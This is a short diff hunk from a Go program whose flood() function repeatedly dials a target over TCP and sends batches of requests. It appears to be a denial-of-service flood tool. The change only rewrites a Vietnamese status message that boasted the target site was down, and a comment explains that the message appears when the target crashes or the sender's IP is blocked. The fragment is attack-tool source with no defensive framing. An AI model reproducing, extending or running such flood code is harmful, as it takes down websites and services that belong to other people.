@@ -195,7 +195,7 @@ func flood() {
 			s, err = net.Dial("tcp", addr)
 		}
 		if err != nil {
-			fmt.Println("[Nguyễn Duy Tuấn]-Web sập chắc rồi hahahhahahhahahaha") //When showing this message, it means ur ip got blocked or the target server down.
+			fmt.Println("[Nguyễn Duy Tuấn]-Đã gửi lượt truy cập!") //When showing this message, it means ur ip got blocked or the target server down.
 		} else {
 			for i := 0; i < 100; i++ {
 				request := ""
